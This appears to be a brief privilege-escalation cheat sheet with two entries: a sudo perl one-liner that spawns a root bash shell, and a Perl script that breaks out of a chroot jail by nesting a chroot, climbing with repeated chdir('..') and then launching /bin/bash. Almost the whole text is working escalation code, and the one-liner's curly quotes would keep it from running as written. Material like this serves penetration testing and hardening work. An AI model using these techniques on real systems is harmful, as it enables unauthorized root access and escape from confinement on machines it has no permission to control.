# Sudo
```bash
sudo perl -e ‘system (“/bin/bash”)’
```
# Chroot scape
```perl
#!/usr/bin/perl
	
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) 
{
    chdir ".."
}
chroot ".";
system("/bin/bash");
```
